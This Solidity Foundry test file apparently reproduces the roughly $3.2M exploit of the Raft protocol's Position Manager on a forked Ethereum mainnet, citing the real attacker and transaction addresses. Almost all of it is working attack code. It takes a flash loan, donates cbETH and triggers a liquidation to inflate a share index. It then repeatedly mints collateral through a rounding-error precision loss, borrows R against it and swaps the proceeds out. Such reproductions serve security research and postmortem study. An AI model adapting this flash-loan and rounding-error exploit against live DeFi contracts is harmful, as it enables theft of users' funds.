// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~3.2 M USD$
// Attacker : https://etherscan.io/address/0xc1f2b71a502b551a65eee9c96318afdd5fd439fa
// Attack Contract : https://etherscan.io/address/0x0a3340129816a86b62b7eafd61427f743c315ef8
// Vulnerable Contract : https://etherscan.io/address/0x9ab6b21cdf116f611110b048987e58894786c244
// Attack Tx :https://etherscan.io/tx/0xfeedbf51b4e2338e38171f6e19501327294ab1907ab44cfd2d7e7336c975ace7

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x9ab6b21cdf116f611110b048987e58894786c244#code

// @Analysis
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1723229393529835972

interface IPRM {
    function liquidate(address position) external;

    struct ERC20PermitSignature {
        address token;
        uint256 value;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function managePosition(
        IERC20 collateralToken,
        address position,
        uint256 collateralChange,
        bool isCollateralIncrease,
        uint256 debtChange,
        bool isDebtIncrease,
        uint256 maxFeePercentage,
        ERC20PermitSignature calldata permitSignature
    ) external returns (uint256 actualCollateralChange, uint256 actualDebtChange);
}

interface IRaftOracle {
    function fetchPrice() external returns (uint256, uint256);
}

interface IERC20Indexable is IERC20 {
    function currentIndex() external view returns (uint256);

    function totalSupply() external view override returns (uint256);

    function mint(address to, uint256 amount) external;

    function burn(address from, uint256 amount) external;
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth,
        address receiver
    ) external payable returns (uint256);
}

contract ContractTest is Test {
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IPRM PRM = IPRM(0x9AB6b21cDF116f611110b048987E58894786C244);
    address liquidablePosition = 0x011992114806E2c3770df73fa0D19884215db85F;
    IERC20Indexable rcbETH_c = IERC20Indexable(0xD0Db31473CaAd65428ba301D2174390d11D0C788);
    IERC20Indexable rcbETH_d = IERC20Indexable(0x7beBe1D451291099D8e05fA2676412c09C96dFbC);
    IERC20 R = IERC20(0x183015a9bA6fF60230fdEaDc3F43b3D788b13e21);
    Uni_Pair_V3 R_USDC_Pair = Uni_Pair_V3(0x190Ed02Adaf1Ef8039fCD3f006b42553467D5045);
    Uni_Pair_V3 WETH_USDC_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    ICurve cbETH_ETH_Pool = ICurve(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
    IRaftOracle RaftOracle = IRaftOracle(0x3cd40D6e8426C9f02Fe7B23867661377E462df3d);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address expContract = 0x0A3340129816a86b62b7eafD61427f743c315ef8;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_543_485);
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(PRM), "PRM");
        vm.label(address(rcbETH_c), "rcbETH_c");
        vm.label(address(rcbETH_d), "rcbETH_d");
        vm.label(address(R), "R");
        vm.label(address(R_USDC_Pair), "R_USDC_Pair");
        vm.label(address(WETH_USDC_Pair), "WETH_USDC_Pair");
        vm.label(address(WETH_USDC_Pair), "WETH_USDC_Pair");
        vm.label(address(RaftOracle), "RaftOracle");
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(cbETH), "cbETH");
    }

    function testExploit() external {
        deal(address(this), 0);
        deal(address(cbETH), address(this), 1.5 ether);
        deal(address(R), address(this), 3405 ether);
        vm.startPrank(address(PRM));
        rcbETH_d.mint(address(this), 3100 ether); // minimum position debt limit: 3_000 rcbETH-d
        vm.stopPrank();

        R.approve(address(PRM), type(uint256).max);
        cbETH.approve(address(PRM), type(uint256).max);

        address[] memory assets = new address[](1);
        assets[0] = address(cbETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 6000 ether;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint("Attacker R balance after exploit", R.balanceOf(address(this)), R.decimals());

        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, WETH.decimals());
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        IERC20(assets[0]).approve(address(aaveV3), amounts[0] + premiums[0]);

        console.log("before infalte index, the storedIndex", rcbETH_c.currentIndex() / 1e18);

        uint256 storedindex1 = rcbETH_c.currentIndex();

        uint256 rcbETH_c_HeldbyAttacker = rcbETH_c.balanceOf(address(expContract)) * 1e18 / storedindex1;

        cbETH.transfer(address(PRM), cbETH.balanceOf(address(this))); // donate cbETH to PRM
        PRM.liquidate(liquidablePosition); // liquidate position to trigger setIndex

        console.log("after infalte index, the storedIndex", rcbETH_c.currentIndex() / 1e18);

        uint256 storedindex2 = rcbETH_c.currentIndex();

        console.log("storedIndex magnification factor", storedindex2 / storedindex1);

        IPRM.ERC20PermitSignature memory ERC20PermitSignature =
            IPRM.ERC20PermitSignature(address(0), uint256(0), uint256(0), uint8(0), bytes32(0), bytes32(0));

        for (uint256 i; i < (60 + rcbETH_c_HeldbyAttacker); i++) {
            PRM.managePosition(cbETH, address(this), 1, true, 0, true, 1e18, ERC20PermitSignature); // mint 1 wei rcbETH-c only using 1 wei cbETH through precision loss(rounding error)
        }

        uint256 collateralChange = cbETH.balanceOf(address(PRM));
        PRM.managePosition(cbETH, address(this), collateralChange, false, 0, true, 1e18, ERC20PermitSignature); // redeem donate cbETH from PRM

        uint256 collateralAmount = rcbETH_c.balanceOf(address(this));
        (uint256 EtherPirce,) = RaftOracle.fetchPrice();
        EtherPirce = EtherPirce / 1e18;
        uint256 debtChange = collateralAmount * EtherPirce * 100 / 130 - rcbETH_d.balanceOf(address(this));
        PRM.managePosition(cbETH, address(this), 0, true, debtChange, true, 1e18, ERC20PermitSignature); // borrow R with remaing collateral

        RTocbETH(); // swap R to cbETH

        return true;
    }

    function RTocbETH() internal {
        R_USDC_Pair.swap(address(this), true, 200_000 ether, uint160(1_205_121_041_394_742_669_707), "");
        WETH_USDC_Pair.swap(
            address(this),
            true,
            int256(USDC.balanceOf(address(this))),
            uint160(1_628_639_395_569_858_913_243_247_992_892_595),
            ""
        );
        WETH.withdraw(WETH.balanceOf(address(this)));
        cbETH_ETH_Pool.exchange{value: 5 ether}(0, 1, 5 ether, 4.5 ether, true, address(this));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (Uni_Pair_V3(msg.sender).token0() == address(R)) {
            R.transfer(address(R_USDC_Pair), uint256(amount0Delta));
        } else if (Uni_Pair_V3(msg.sender).token0() == address(USDC)) {
            USDC.transfer(address(WETH_USDC_Pair), uint256(amount0Delta));
        }
    }

    receive() external payable {}
}
